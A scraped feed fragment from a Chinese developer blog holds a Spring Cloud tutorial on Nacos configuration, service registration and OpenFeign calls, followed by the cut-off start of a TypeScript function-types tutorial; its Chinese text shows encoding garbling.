data-id="heading-0">Nacos</h3>
<h4 data-id="heading-1">ä¸‹è½½å®‰è£…</h4>
<ul>
<li>ä¸‹è½½ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Ftags" target="_blank" title="https://github.com/alibaba/nacos/tags" ref="nofollow noopener noreferrer">github.com/alibaba/nacâ€¦</a></li>
<li>å¯åŠ¨ï¼š<code>startup.cmd -m standalone</code></li>
<li>è®¿é—®ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8848%2Fnacos%2F" target="_blank" title="http://localhost:8848/nacos/" ref="nofollow noopener noreferrer">http://localhost:8848/nacos/</a>     è´¦å·å¯†ç ï¼šnacos</li>
</ul>
<h4 data-id="heading-2">åŸºç¡€æ¦‚å¿µ</h4>
<ul>
<li>nacosé…ç½®ä¸­å¿ƒé€šè¿‡<code>namespace</code>ã€<code>group</code> å’Œ <code>dataId</code> æ¥å”¯ä¸€ç¡®å®šä¸€æ¡é…ç½®ï¼Œ</li>
<li>dataIdçš„æ ¼å¼ï¼š<code>${prefix}-${spring.profiles.active}.${file-extension}</code>
<ul>
<li><code>prefix</code>ï¼šé»˜è®¤ä¸º<code>spring.application.name</code></li>
<li><code>spring.profiles.active</code>ï¼šå½“å‰æ¿€æ´»çš„ç¯å¢ƒï¼Œå½“<code>spring.profiles.active</code>ä¸ºç©ºæ—¶ï¼Œå¯¹åº”çš„è¿æ¥ç¬¦<code>-</code>ä¹Ÿå°†ä¸å­˜åœ¨ï¼ŒdataIdçš„æ‹¼æ¥æ ¼å¼å˜ æˆï¼š<code>${prefix}.${file-extension}</code></li>
<li><code>${file-extension}</code>ï¼šé»˜è®¤ä¸º<code>properties</code></li>
</ul>
</li>
<li>æ‹‰å–å¤šä¸ªå…±äº«æ–‡ä»¶ï¼Œè¦åœ¨åŒä¸€å‘½åç©ºé—´ä¸‹ï¼Œä¸èƒ½è·¨å‘½åç©ºé—´</li>
<li>æ³¨æ„springbootå’Œspringcloudçš„ç‰ˆæœ¬å¯¹åº”</li>
</ul>
<h4 data-id="heading-3">é…ç½®ä¸­å¿ƒ</h4>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.5</span>&lt;/version&gt;
&lt;/dependency&gt;
    
&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">2021.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
</li>
<li>
<p>å®Œæ•´<code>bootstrap.properties</code>é…ç½®ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.application.name=testccb
spring.cloud.nacos.config.username=nacos
spring.cloud.nacos.config.password=nacos
spring.cloud.nacos.config.server-addr=192.168.1.211:8848
spring.cloud.nacos.config.namespace=4f4b-363e-47a5-8a-dbd288c
spring.cloud.nacos.config.group=com.iotsh

# æ‹‰å–å…±äº«çš„é…ç½®
spring.cloud.nacos.config.extension-configs[0].data-id=testccb.properties
spring.cloud.nacos.config.extension-configs[0].group=ccb
spring.cloud.nacos.config.extension-configs[0].refresh=true
</code></pre>
</li>
</ul>
<h4 data-id="heading-4">æ³¨å†Œä¸­å¿ƒ</h4>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.5</span>&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">2021.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
</li>
</ul>
<ul>
<li>
<p>é…ç½®æ–‡ä»¶</p>
<pre><code class="hljs language-properties" lang="properties">spring.cloud.nacos.discovery.server-addr=192.168.1.211:8848
spring.cloud.nacos.discovery.username=nacos
spring.cloud.nacos.discovery.password=nacos
spring.cloud.nacos.discovery.namespace=ed4b94b3-deff-49f1-8973-34029756083d
</code></pre>
</li>
<li>
<p>ä¸»å¯åŠ¨ç±»ï¼š<code>@EnableDiscoveryClient</code></p>
</li>
</ul>
<h3 data-id="heading-5">OpenFeign</h3>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-properties" lang="properties">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
</li>
<li>
<p>ä¸»å¯åŠ¨ç±»ï¼š<code>@EnableFeignClients </code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableDiscoveryClient</span>
<span class="hljs-meta">@EnableFeignClients</span> 
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EurekaClientApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(CategoryApplication.class,args);
    }
}
</code></pre>
</li>
<li>
<p>é…ç½®æ–‡ä»¶</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">feign:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">config:</span>
      <span class="hljs-attr">default:</span>
        <span class="hljs-attr">connect-timeout:</span> <span class="hljs-number">5000</span>
        <span class="hljs-attr">read-timeout:</span> <span class="hljs-number">5000</span>
</code></pre>
</li>
<li>
<p>åˆ›å»º<code>FeignClient</code> (è°ƒç”¨è€…)ï¼Œæ³¨æ„ä¼ å‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FeignClient(value = "product")</span> <span class="hljs-comment">// è¢«è°ƒç”¨çš„æœåŠ¡åç§°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductClient</span> {
    
    <span class="hljs-meta">@RequestMapping("/status")</span> <span class="hljs-comment">// è¢«è°ƒç”¨çš„æœåŠ¡æ¥å£</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">status</span><span class="hljs-params">()</span>;

    <span class="hljs-meta">@GetMapping("/paramRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">paramRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("id")</span> Integer id, <span class="hljs-meta">@RequestParam("name")</span> String name)</span>;

    <span class="hljs-meta">@PostMapping("/bodyRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">bodyRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>;
}
</code></pre>
</li>
<li>
<p>Controllerä¸­ä½¿ç”¨</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductClient productClient;  

    <span class="hljs-meta">@GetMapping("/find")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">find</span><span class="hljs-params">()</span>{
        <span class="hljs-keyword">return</span> productClient.status();
    }
}
</code></pre>
</li>
</ul>
<ul>
<li>
<p>è¢«è°ƒç”¨çš„æœåŠ¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    <span class="hljs-comment">// æ²¡æœ‰å‚æ•°</span>
    <span class="hljs-meta">@RequestMapping("/status")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">status</span><span class="hljs-params">()</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"client b is ok!"</span>;
    }

    <span class="hljs-comment">// paramå‚æ•°</span>
    <span class="hljs-meta">@GetMapping("/paramRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">paramRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("id")</span> Integer id, <span class="hljs-meta">@RequestParam("name")</span> String name)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"paramRequest method is ok!, id:"</span> + id +<span class="hljs-string">", name:"</span>+ name;
    }

    <span class="hljs-comment">// bodyæœ‰å‚æ•°</span>
    <span class="hljs-meta">@PostMapping("/bodyRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">bodyRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"bodyRequest method is ok!, user:"</span> + user.toString();
    }
}
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•]]></title>    <link>https://juejin.cn/post/7592455394062368806</link>    <guid>https://juejin.cn/post/7592455394062368806</guid>    <pubDate>2026-01-07T13:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592455394062368806" data-draft-id="7592424951661428762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-07T13:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¦‚æœä½ å¥½"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¦‚æœä½ å¥½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T13:26:20.000Z" title="Wed Jan 07 2026 13:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•</h2>
<p>å‡½æ•°æ˜¯TypeScriptä¸­æœ€æ ¸å¿ƒçš„å¤ç”¨å•å…ƒï¼Œä¹Ÿæ˜¯ç±»å‹çº¦æŸçš„é«˜é¢‘åœºæ™¯ã€‚å¾ˆå¤šå¼€å‘è€…åªä¼šç»™å‡½æ•°åŠ ç®€å•çš„å‚æ•°/è¿”å›å€¼ç±»å‹ï¼Œå´å¿½ç•¥äº†å¯é€‰å‚æ•°ã€readonlyå‚æ•°ã€é«˜é˜¶å‡½æ•°ç­‰å®ç”¨ç‰¹æ€§ã€‚æœ¬æ–‡ä¼šä»åŸºç¡€åˆ°è¿›é˜¶ï¼ŒæŠŠTSå‡½æ•°ç±»å‹çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹è®²é€ï¼Œè¦†ç›–æ—¥å¸¸å¼€å‘æ‰€æœ‰åœºæ™¯ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€åŸºç¡€æ ¸å¿ƒï¼šFunctionç±»å‹ä¸å‡½æ•°ç±»å‹è¡¨è¾¾å¼</h3>
<p>TSä¸­æè¿°å‡½æ•°ç±»å‹æœ‰ä¸¤ç§æ ¸å¿ƒæ–¹å¼ï¼š<code>Function</code> ç±»å‹ï¼ˆå®½æ³›ï¼‰å’Œ**å‡½æ•°ç±»å‹è¡¨è¾¾å¼ï¼Œå…ˆåˆ†æ¸…è¿™ä¸¤ç§å†™æ³•çš„åŒºåˆ«ã€‚</p>
<h4 data-id="heading-2">1. Functionç±»å‹ï¼ˆä¸æ¨èï¼‰</h4>
<p><code>Function</code> æ˜¯TSçš„å†…ç½®ç±»å‹ï¼Œä»£è¡¨â€œä»»æ„å‡½æ•°â€ï¼Œä½†å®ƒè¿‡äºå®½æ³›ï¼Œä¼šä¸¢å¤±ç±»å‹çº¦æŸçš„æ„ä¹‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®½æ³›çš„Functionç±»å‹ï¼šèƒ½æ¥æ”¶ä»»ä½•å‡½æ•°ï¼Œä½†æ— æ³•çº¦æŸå‚æ•°/è¿”å›å€¼</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">fn</span>: <span class="hljs-title class_">Function</span>;
fn = <span class="hljs-function">() =&gt;</span> <span class="hljs-number">123</span>; <span class="hljs-comment">// ä»»æ„å‡½æ•°éƒ½èƒ½èµ‹å€¼</span>
fn = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">string</span></span>) =&gt;</span> a; <span class="hljs-comment">//  æ— ç±»å‹æ£€æŸ¥</span>
<span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">//è°ƒç”¨æ—¶å‚æ•°ä»»æ„ï¼Œæ— æŠ¥é”™</span>
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•çº¦æŸå‚æ•°ä¸ªæ•°ã€ç±»å‹å’Œè¿”å›å€¼ï¼Œç›¸å½“äºå¼±åŒ–äº†TSçš„ç±»å‹æ£€æŸ¥ï¼Œä»…é€‚åˆå®Œå…¨ä¸ç¡®å®šå‡½æ•°ç»“æ„çš„æç«¯åœºæ™¯ã€‚</p>
<h4 data-id="heading-3">2. å‡½æ•°ç±»å‹è¡¨è¾¾å¼ï¼ˆæ¨èï¼‰</h4>
<p>ç”¨ <code>(å‚æ•°: ç±»å‹) =&gt; è¿”å›å€¼ç±»å‹</code> çš„è¯­æ³•ï¼Œç²¾å‡†æè¿°å‡½æ•°ç»“æ„ï¼Œæ˜¯æ—¥å¸¸å¼€å‘çš„é¦–é€‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰ç²¾å‡†çš„å‡½æ•°ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// èµ‹å€¼ï¼šå¿…é¡»ä¸¥æ ¼åŒ¹é…å‚æ•°å’Œè¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y; <span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-comment">// const add2: AddFunc = (x: string, y: string) =&gt; x + y; //  æŠ¥é”™ï¼šå‚æ•°ç±»å‹ä¸åŒ¹é…</span>
</code></pre>
<h3 data-id="heading-4">äºŒã€å‚æ•°è¿›é˜¶ï¼šå¯é€‰/é»˜è®¤/è§£æ„/rest/åªè¯»å‚æ•°</h3>
<p>å‡½æ•°å‚æ•°çš„çº¦æŸæ˜¯TSå‡½æ•°ç±»å‹çš„æ ¸å¿ƒï¼ŒæŒæ¡ä»¥ä¸‹5ç§å‚æ•°ç±»å‹ã€‚</p>
<h4 data-id="heading-5">1. å¯é€‰å‚æ•°ï¼ˆ?ï¼‰</h4>
<p>ç”¨ <code>?</code> æ ‡è®°å‚æ•°ï¼Œè¡¨ç¤ºâ€œå¯ä¼ å¯ä¸ä¼ â€ï¼Œ<strong>å¿…é¡»æ”¾åœ¨å¿…é€‰å‚æ•°ä¹‹å</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// messageæ˜¯å¯é€‰å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, message?: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> message ? <span class="hljs-string">`<span class="hljs-subst">${message}</span>, <span class="hljs-subst">${name}</span>`</span> : <span class="hljs-string">`Hello, <span class="hljs-subst">${name}</span>`</span>;
}

<span class="hljs-title function_">greet</span>(<span class="hljs-string">"å¼ ä¸‰"</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œè¿”å› "Hello, å¼ ä¸‰"</span>
<span class="hljs-title function_">greet</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-string">"æ—©ä¸Šå¥½"</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œè¿”å› "æ—©ä¸Šå¥½, æå››"</span>
<span class="hljs-comment">// greet(undefined, "Hi"); //  æŠ¥é”™ï¼šå¿…é€‰å‚æ•°nameä¸èƒ½çœç•¥</span>
</code></pre>
<h4 data-id="heading-6">2. å‚æ•°é»˜è®¤å€¼</h4>
<p>å‚æ•°å¸¦é»˜è®¤å€¼æ—¶ï¼Œè‡ªåŠ¨æˆä¸ºå¯é€‰å‚æ•°ï¼Œç±»å‹ä¼šæ ¹æ®é»˜è®¤å€¼æ¨å¯¼ï¼ˆä¹Ÿå¯æ˜¾å¼çº¦æŸï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// counté»˜è®¤å€¼ä¸º10ï¼Œç±»å‹è‡ªåŠ¨æ¨å¯¼ä¸ºnumber</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">repeat</span>(<span class="hljs-params">str: <span class="hljs-built_in">string</span>, count = <span class="hljs-number">10</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">repeat</span>(count);
}

<span class="hljs-title function_">repeat</span>(<span class="hljs-string">"TS"</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œé‡å¤10æ¬¡</span>
<span class="hljs-title function_">repeat</span>(<span class="hljs-string">"JS"</span>, <span class="hljs-number">5</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œé‡å¤5æ¬¡</span>
<span class="hljs-comment">// repeat("React", "5"); //  æŠ¥é”™ï¼šcountå¿…é¡»æ˜¯number</span>
</code></pre>
<h4 data-id="heading-7">3. å‚æ•°è§£æ„ï¼ˆå¯¹è±¡/æ•°ç»„ï¼‰</h4>
<p>å‡½æ•°å‚æ•°æ˜¯å¯¹è±¡/æ•°ç»„æ—¶ï¼Œå¯ç›´æ¥è§£æ„å¹¶çº¦æŸç±»å‹ï¼Œè®©ä»£ç æ›´ç®€æ´ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. å¯¹è±¡è§£æ„ + ç±»å‹çº¦æŸ</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printUser</span>(<span class="hljs-params">{ name, age }: User</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å§“åï¼š<span class="hljs-subst">${name}</span>ï¼Œå¹´é¾„ï¼š<span class="hljs-subst">${age}</span>`</span>);
}

<span class="hljs-comment">// 2. æ•°ç»„è§£æ„ + ç±»å‹çº¦æŸ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printArr</span>(<span class="hljs-params">[a, b]: [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">string</span>]</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b);
}

<span class="hljs-title function_">printUser</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> }); <span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-title function_">printArr</span>([<span class="hljs-number">1</span>, <span class="hljs-string">"TS"</span>]); <span class="hljs-comment">//  æ­£ç¡®</span>
</code></pre>
<h4 data-id="heading-8">4. restå‚æ•°ï¼ˆå‰©ä½™å‚æ•°ï¼‰</h4>
<p>ç”¨ <code>...</code> æ¥æ”¶å¤šä¸ªå‚æ•°ï¼Œç±»å‹å¿…é¡»æ˜¯<strong>æ•°ç»„</strong>ï¼Œä¸”åªèƒ½æ”¾åœ¨å‚æ•°åˆ—è¡¨æœ€åï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ±‚å’Œå‡½æ•°ï¼šæ¥æ”¶ä»»æ„å¤šä¸ªæ•°å­—å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">...nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> nums.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
}

<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œè¿”å›3</span>
<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// æ­£ç¡®ï¼Œè¿”å›10</span>
<span class="hljs-comment">// sum(1, "2"); //  æŠ¥é”™ï¼šrestå‚æ•°å¿…é¡»æ˜¯number[]</span>
</code></pre>
<h4 data-id="heading-9">5. readonlyåªè¯»å‚æ•°</h4>
<p>ç”¨ <code>readonly</code> çº¦æŸå‚æ•°ï¼ˆé€šå¸¸æ˜¯æ•°ç»„/å¯¹è±¡ï¼‰ï¼Œé¿å…å‡½æ•°å†…éƒ¨ä¿®æ”¹å…¥å‚ï¼Œæå‡ä»£ç å¥å£®æ€§ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¦æŸæ•°ç»„å‚æ•°ä¸ºåªè¯»ï¼Œç¦æ­¢ä¿®æ”¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printArr</span>(<span class="hljs-params">arr: <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">void</span> {
